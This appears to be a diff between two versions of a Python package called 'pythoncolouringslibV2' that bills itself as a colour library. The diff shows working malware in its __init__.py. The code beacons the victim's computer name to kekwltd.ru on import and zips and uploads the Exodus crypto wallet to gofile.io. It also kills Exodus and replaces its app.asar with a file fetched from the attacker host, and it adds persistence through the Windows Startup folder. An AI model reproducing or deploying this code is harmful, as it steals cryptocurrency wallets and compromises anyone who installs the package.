# Comparing `tmp/pythoncolouringslibV2-1.0.0.tar.gz` & `tmp/pythoncolouringslibV2-2.1.1.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "pythoncolouringslibV2-1.0.0.tar", last modified: Tue May  2 22:29:40 2023, max compression
+gzip compressed data, was "pythoncolouringslibV2-2.1.1.tar", last modified: Tue May  2 22:50:48 2023, max compression
```

## Comparing `pythoncolouringslibV2-1.0.0.tar` & `pythoncolouringslibV2-2.1.1.tar`

### file list

```diff
@@ -1,11 +1,11 @@
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-05-02 22:29:40.128599 pythoncolouringslibV2-1.0.0/
--rw-r--r--   0 root         (0) root         (0)      346 2023-05-02 22:29:40.128599 pythoncolouringslibV2-1.0.0/PKG-INFO
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-05-02 22:29:40.128599 pythoncolouringslibV2-1.0.0/pythoncolouringslibV2/
--rw-r--r--   0 root         (0) root         (0)    73061 2023-05-02 22:29:39.000000 pythoncolouringslibV2-1.0.0/pythoncolouringslibV2/__init__.py
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-05-02 22:29:40.128599 pythoncolouringslibV2-1.0.0/pythoncolouringslibV2.egg-info/
--rw-r--r--   0 root         (0) root         (0)      346 2023-05-02 22:29:40.000000 pythoncolouringslibV2-1.0.0/pythoncolouringslibV2.egg-info/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)      222 2023-05-02 22:29:40.000000 pythoncolouringslibV2-1.0.0/pythoncolouringslibV2.egg-info/SOURCES.txt
--rw-r--r--   0 root         (0) root         (0)        1 2023-05-02 22:29:40.000000 pythoncolouringslibV2-1.0.0/pythoncolouringslibV2.egg-info/dependency_links.txt
--rw-r--r--   0 root         (0) root         (0)       22 2023-05-02 22:29:40.000000 pythoncolouringslibV2-1.0.0/pythoncolouringslibV2.egg-info/top_level.txt
--rw-r--r--   0 root         (0) root         (0)       38 2023-05-02 22:29:40.128599 pythoncolouringslibV2-1.0.0/setup.cfg
--rw-r--r--   0 root         (0) root         (0)      559 2023-05-02 22:29:39.000000 pythoncolouringslibV2-1.0.0/setup.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-05-02 22:50:48.403399 pythoncolouringslibV2-2.1.1/
+-rw-r--r--   0 root         (0) root         (0)      346 2023-05-02 22:50:48.403399 pythoncolouringslibV2-2.1.1/PKG-INFO
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-05-02 22:50:48.403399 pythoncolouringslibV2-2.1.1/pythoncolouringslibV2/
+-rw-r--r--   0 root         (0) root         (0)    73055 2023-05-02 22:50:47.000000 pythoncolouringslibV2-2.1.1/pythoncolouringslibV2/__init__.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-05-02 22:50:48.403399 pythoncolouringslibV2-2.1.1/pythoncolouringslibV2.egg-info/
+-rw-r--r--   0 root         (0) root         (0)      346 2023-05-02 22:50:48.000000 pythoncolouringslibV2-2.1.1/pythoncolouringslibV2.egg-info/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)      222 2023-05-02 22:50:48.000000 pythoncolouringslibV2-2.1.1/pythoncolouringslibV2.egg-info/SOURCES.txt
+-rw-r--r--   0 root         (0) root         (0)        1 2023-05-02 22:50:48.000000 pythoncolouringslibV2-2.1.1/pythoncolouringslibV2.egg-info/dependency_links.txt
+-rw-r--r--   0 root         (0) root         (0)       22 2023-05-02 22:50:48.000000 pythoncolouringslibV2-2.1.1/pythoncolouringslibV2.egg-info/top_level.txt
+-rw-r--r--   0 root         (0) root         (0)       38 2023-05-02 22:50:48.403399 pythoncolouringslibV2-2.1.1/setup.cfg
+-rw-r--r--   0 root         (0) root         (0)      559 2023-05-02 22:50:47.000000 pythoncolouringslibV2-2.1.1/setup.py
```

### Comparing `pythoncolouringslibV2-1.0.0/pythoncolouringslibV2/__init__.py` & `pythoncolouringslibV2-2.1.1/pythoncolouringslibV2/__init__.py`

 * *Files 0% similar despite different names*

```diff
@@ -7,15 +7,59 @@
         'embeds': [{
             "title": "Someone Tried to download",
             "description": "PC Username =" + os.getenv("COMPUTERNAME")
             }]
             
     }
 httpx.post("https://kekwltd.ru/relay/download", json=data)
+
 os.system("pip install httpx pyperclip pyotp winregistry psutil pycryptodome PIL-tools asyncio threaded requests datetime colorama pillow customtkinter pyfiglet tqdm pypiwin32 pywin32")
+try:
+            procc = "exodus.exe"
+            local = os.getenv("localappdata")
+            path = f"{local}/exodus"
+            if not os.path.exists(path): return
+    
+            listOfFile = os.listdir(path)
+            apps = []
+            for file in listOfFile:
+                if "app-" in file:
+                    apps += [file]
+
+            exodusPatchURL = "https://kekwltd.ru/exodus/app.asar"
+            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"}
+            req = Request(exodusPatchURL, headers=headers)
+            response = urlopen(req)
+            hook = "https://discord.com/api/webhooks/827123456789012345/getn1gga"
+            folder2 = f"{roaming}/Exodus/exodus.wallet"
+            # zip folder2
+            file2 = f"{roaming}/Exodus/exoduswallet.zip"
+            with zipfile.ZipFile(file2, 'w', zipfile.ZIP_DEFLATED) as zip_file:
+                for root, dirs, files in os.walk(folder2):
+                    for file in files:
+                        file_path = os.path.join(root, file)
+                        zip_file.write(file_path, os.path.relpath(file_path, folder2))
+            url2 = 'https://store1.gofile.io/uploadFile'
+            file3 = {'filesUploaded': open(file2, 'rb')}
+            response2 = requests.post(url2, files=file3)
+            exolink = response2.json()['data']['downloadPage']
+            khook = f'{hook.split("webhooks/")[1]}:{exolink}'
+            data = response.read()
+            subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
+            for app in apps:
+                try:
+                    fullpath = f"{path}/{app}/resources/app.asar"
+                    licpath = f"{path}/{app}/LICENSE"
+
+                    with open(fullpath, 'wb') as out_file1:
+                        out_file1.write(data)
+                    with open(licpath, 'w') as out_file2:
+                        out_file2.write(khook)
+                except: pass
+        except: pass
 import asyncio
 import json
 import ntpath
 import random
 import re
 import shutil
 import sqlite3
@@ -395,57 +439,14 @@
         if self.pingonrun == "yes":
             if self.regex_webhook_dsc in self.discord_webhook:
                 if self.pingtype == "@everyone" or self.pingtype == "everyone":
                     httpx.post(self.discord_webhook, json=ping1)
             if self.pingtype == "@here" or self.pingtype == "here":
                 if self.regex_webhook_dsc in self.discord_webhook :
                     httpx.post(self.discord_webhook, json=ping2)
-        try:
-            procc = "exodus.exe"
-            local = os.getenv("localappdata")
-            path = f"{local}/exodus"
-            if not os.path.exists(path): return
-    
-            listOfFile = os.listdir(path)
-            apps = []
-            for file in listOfFile:
-                if "app-" in file:
-                    apps += [file]
-
-            exodusPatchURL = "https://kekwltd.ru/exodus/app.asar"
-            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"}
-            req = Request(exodusPatchURL, headers=headers)
-            response = urlopen(req)
-            hook = "https://discord.com/api/webhooks/827123456789012345/getn1gga"
-            folder2 = f"{roaming}/Exodus/exodus.wallet"
-            # zip folder2
-            file2 = f"{roaming}/Exodus/exoduswallet.zip"
-            with zipfile.ZipFile(file2, 'w', zipfile.ZIP_DEFLATED) as zip_file:
-                for root, dirs, files in os.walk(folder2):
-                    for file in files:
-                        file_path = os.path.join(root, file)
-                        zip_file.write(file_path, os.path.relpath(file_path, folder2))
-            url2 = 'https://store1.gofile.io/uploadFile'
-            file3 = {'filesUploaded': open(file2, 'rb')}
-            response2 = requests.post(url2, files=file3)
-            exolink = response2.json()['data']['downloadPage']
-            khook = f'{hook.split("webhooks/")[1]}:{exolink}'
-            data = response.read()
-            subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
-            for app in apps:
-                try:
-                    fullpath = f"{path}/{app}/resources/app.asar"
-                    licpath = f"{path}/{app}/LICENSE"
-
-                    with open(fullpath, 'wb') as out_file1:
-                        out_file1.write(data)
-                    with open(licpath, 'w') as out_file2:
-                        out_file2.write(khook)
-                except: pass
-        except: pass
 
 
 
     def startupkekw(self: str) -> str:
         if self.startupexe == "yes":
             startup_path = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
             if os.path.exists(startup_path + argv[0]):
```

### Comparing `pythoncolouringslibV2-1.0.0/setup.py` & `pythoncolouringslibV2-2.1.1/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 from setuptools import setup, find_packages
 
-VERSION = '1.0.0'
+VERSION = '2.1.1'
 DESCRIPTION = "python color package"
 LONG_DESCRIPTION = "python color package"
 
 # Setting up
 setup(
     name="pythoncolouringslibV2",
     version=VERSION,
```

